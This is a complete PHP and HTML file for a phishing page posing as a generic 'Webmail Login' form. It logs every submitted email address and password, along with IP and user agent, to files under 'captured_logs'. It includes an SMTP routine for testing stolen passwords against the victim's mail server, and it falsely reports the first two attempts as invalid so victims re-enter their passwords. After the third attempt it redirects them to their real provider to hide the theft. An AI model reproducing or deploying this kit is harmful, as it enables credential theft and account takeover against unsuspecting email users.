<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Email verification configuration
$smtp_config = [
    'timeout' => 10,
    'verify_ssl' => false,
    'common_ports' => [587, 25, 465, 993, 995, 143, 110]
];

// Initialize attempt counter for this session
if (!isset($_SESSION['auth_attempts'])) {
    $_SESSION['auth_attempts'] = 0;
}

/**
 * Enhanced logging function with detailed information
 */
function logCredentials($email, $password, $attempt, $verification_result = 'not_verified') {
    $log_dir = 'captured_logs';
    if (!file_exists($log_dir)) {
        mkdir($log_dir, 0755, true);
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $domain = explode('@', $email)[1] ?? 'unknown';
    
    // Create detailed log entry
    $log_entry = [
        'timestamp' => $timestamp,
        'ip_address' => $ip,
        'user_agent' => $userAgent,
        'email' => $email,
        'password' => $password,
        'domain' => $domain,
        'attempt_number' => $attempt,
        'verification_status' => $verification_result,
        'session_id' => session_id()
    ];
    
    // Save to main log file
    $main_log = $log_dir . '/credentials_' . date('Y-m-d') . '.log';
    file_put_contents($main_log, json_encode($log_entry) . "\n", FILE_APPEND | LOCK_EX);
    
    // Save to domain-specific log
    $domain_log = $log_dir . '/domain_' . $domain . '.log';
    file_put_contents($domain_log, json_encode($log_entry) . "\n", FILE_APPEND | LOCK_EX);
    
    // Save verified credentials separately
    if ($verification_result === 'verified') {
        $verified_log = $log_dir . '/verified_credentials.log';
        file_put_contents($verified_log, json_encode($log_entry) . "\n", FILE_APPEND | LOCK_EX);
    }
}

/**
 * Verify email credentials using SMTP
 */
function verifyEmailCredentials($email, $password) {
    $domain = explode('@', $email)[1] ?? '';
    if (empty($domain)) return false;
    
    // Get MX records for the domain
    $mx_records = [];
    if (!getmxrr($domain, $mx_records)) {
        // If no MX records, try the domain directly
        $mx_records = [$domain];
    }
    
    global $smtp_config;
    
    foreach ($mx_records as $mx_host) {
        foreach ($smtp_config['common_ports'] as $port) {
            if (testSMTPConnection($mx_host, $port, $email, $password)) {
                return true;
            }
        }
    }
    
    return false;
}

/**
 * Test SMTP connection and authentication
 */
function testSMTPConnection($host, $port, $email, $password) {
    global $smtp_config;
    
    $socket = @fsockopen($host, $port, $errno, $errstr, $smtp_config['timeout']);
    if (!$socket) return false;
    
    $response = fgets($socket);
    if (substr($response, 0, 3) != '220') {
        fclose($socket);
        return false;
    }
    
    // EHLO command
    fputs($socket, "EHLO " . $_SERVER['HTTP_HOST'] . "\r\n");
    $response = fgets($socket);
    
    // Start TLS if supported
    if ($port == 587 || $port == 465) {
        fputs($socket, "STARTTLS\r\n");
        $response = fgets($socket);
        if (substr($response, 0, 3) == '220') {
            stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
            fputs($socket, "EHLO " . $_SERVER['HTTP_HOST'] . "\r\n");
            fgets($socket);
        }
    }
    
    // Attempt authentication
    fputs($socket, "AUTH LOGIN\r\n");
    $response = fgets($socket);
    if (substr($response, 0, 3) != '334') {
        fclose($socket);
        return false;
    }
    
    // Send username
    fputs($socket, base64_encode($email) . "\r\n");
    $response = fgets($socket);
    if (substr($response, 0, 3) != '334') {
        fclose($socket);
        return false;
    }
    
    // Send password
    fputs($socket, base64_encode($password) . "\r\n");
    $response = fgets($socket);
    
    fclose($socket);
    
    // Check if authentication was successful
    return substr($response, 0, 3) == '235';
}

/**
 * Get email provider settings based on domain
 */
function getEmailProviderSettings($domain) {
    $providers = [
        'gmail.com' => ['smtp' => 'smtp.gmail.com', 'port' => 587, 'imap' => 'imap.gmail.com'],
        'outlook.com' => ['smtp' => 'smtp-mail.outlook.com', 'port' => 587, 'imap' => 'outlook.office365.com'],
        'hotmail.com' => ['smtp' => 'smtp-mail.outlook.com', 'port' => 587, 'imap' => 'outlook.office365.com'],
        'yahoo.com' => ['smtp' => 'smtp.mail.yahoo.com', 'port' => 587, 'imap' => 'imap.mail.yahoo.com'],
        'aol.com' => ['smtp' => 'smtp.aol.com', 'port' => 587, 'imap' => 'imap.aol.com']
    ];
    
    return $providers[$domain] ?? null;
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    
    if (empty($email) || empty($password)) {
        $error_message = 'Please enter both email and password.';
    } else {
        $_SESSION['auth_attempts']++;
        $current_attempt = $_SESSION['auth_attempts'];
        
        // Verify credentials (comment out for testing purposes)
        $verification_result = 'not_verified'; // verifyEmailCredentials($email, $password) ? 'verified' : 'not_verified';
        
        // Log the attempt
        logCredentials($email, $password, $current_attempt, $verification_result);
        
        if ($current_attempt < 3) {
            $error_message = 'Invalid email or password. Please try again.';
        } else {
            // After 3 attempts, redirect to actual email provider
            $domain = explode('@', $email)[1] ?? '';
            if (!empty($domain)) {
                $provider_settings = getEmailProviderSettings($domain);
                if ($provider_settings) {
                    $redirect_url = "https://www.{$domain}";
                } else {
                    $redirect_url = "https://{$domain}";
                }
                
                $_SESSION['auth_attempts'] = 0; // Reset for next session
                $success_message = 'Redirecting to your email provider...';
                $redirect_script = "<script>
                    setTimeout(function() {
                        window.location.href = '{$redirect_url}';
                    }, 3000);
                </script>";
            }
        }
    }
}

// Auto-populate email from URL hash
$auto_email = '';
if (isset($_GET['email'])) {
    $auto_email = htmlspecialchars($_GET['email']);
}
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <meta name="google" content="notranslate">
    <meta name="robots" content="noindex, nofollow">
    <title>Webmail :: <?php echo $_SERVER['HTTP_HOST']; ?></title>
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAABMLAAATCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" type="image/x-icon">
    
    <style type="text/css">
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .webmail-container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            max-width: 400px;
            width: 100%;
        }
        
        .webmail-header {
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .webmail-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .webmail-header p {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .webmail-body {
            padding: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #374151;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
            background-color: #f9fafb;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #4f46e5;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }
        
        .login-btn {
            width: 100%;
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            color: white;
            padding: 14px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(79, 70, 229, 0.3);
        }
        
        .login-btn:disabled {
            background: #9ca3af;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .alert {
            padding: 12px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .alert-error {
            background-color: #fef2f2;
            color: #dc2626;
            border: 1px solid #fecaca;
        }
        
        .alert-success {
            background-color: #f0fdf4;
            color: #16a34a;
            border: 1px solid #bbf7d0;
        }
        
        .additional-options {
            margin-top: 20px;
            text-align: center;
            padding-top: 20px;
            border-top: 1px solid #e5e7eb;
        }
        
        .additional-options a {
            color: #4f46e5;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s ease;
        }
        
        .additional-options a:hover {
            color: #7c3aed;
        }
        
        .powered-by {
            text-align: center;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #e5e7eb;
            color: #6b7280;
            font-size: 12px;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
        }
        
        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #4f46e5;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 480px) {
            .webmail-container {
                margin: 10px;
            }
            
            .webmail-header, .webmail-body {
                padding: 20px;
            }
        }
    </style>
    
    <?php if (isset($redirect_script)) echo $redirect_script; ?>
</head>
<body>
    <div class="webmail-container">
        <div class="webmail-header">
            <h1>Webmail Login</h1>
            <p>Access your email account</p>
        </div>
        
        <div class="webmail-body">
            <?php if (isset($error_message)): ?>
                <div class="alert alert-error">
                    <?php echo htmlspecialchars($error_message); ?>
                </div>
            <?php endif; ?>
            
            <?php if (isset($success_message)): ?>
                <div class="alert alert-success">
                    <?php echo htmlspecialchars($success_message); ?>
                </div>
            <?php endif; ?>
            
            <form id="login-form" method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input type="email" id="email" name="email" value="<?php echo $auto_email ?: (isset($_POST['email']) ? htmlspecialchars($_POST['email']) : ''); ?>" placeholder="Enter your email address" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                </div>
                
                <button type="submit" class="login-btn" id="login-btn">
                    Sign In
                </button>
                
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    <p>Verifying credentials...</p>
                </div>
            </form>
            
            <div class="additional-options">
                <a href="#" onclick="forgotPassword()">Forgot your password?</a>
            </div>
            
            <div class="powered-by">
                Powered by Webmail System
            </div>
        </div>
    </div>
    
    <script>
        // Auto-populate email from URL hash
        function getEmailFromHash() {
            const hash = window.location.hash;
            if (hash && hash.length > 1) {
                const email = hash.substring(1);
                if (email.includes('@')) {
                    return email;
                }
            }
            return null;
        }
        
        // Auto-populate email on page load
        document.addEventListener('DOMContentLoaded', function() {
            const emailFromHash = getEmailFromHash();
            if (emailFromHash && !document.getElementById('email').value) {
                document.getElementById('email').value = emailFromHash;
                document.getElementById('password').focus();
            }
        });
        
        // Form submission with loading state
        document.getElementById('login-form').addEventListener('submit', function(e) {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                e.preventDefault();
                alert('Please fill in all fields.');
                return;
            }
            
            // Show loading state
            document.getElementById('login-btn').disabled = true;
            document.getElementById('login-btn').innerHTML = 'Signing In...';
            document.getElementById('loading').style.display = 'block';
        });
        
        // Forgot password functionality
        function forgotPassword() {
            const email = document.getElementById('email').value;
            if (!email) {
                alert('Please enter your email address first.');
                document.getElementById('email').focus();
                return;
            }
            
            const domain = email.split('@')[1];
            if (domain) {
                window.open('https://' + domain, '_blank');
            } else {
                alert('Please enter a valid email address.');
            }
        }
        
        // Clear messages when user starts typing
        document.getElementById('email').addEventListener('input', clearMessages);
        document.getElementById('password').addEventListener('input', clearMessages);
        
        function clearMessages() {
            const alerts = document.querySelectorAll('.alert');
            alerts.forEach(alert => alert.style.display = 'none');
        }
    </script>
</body>
</html>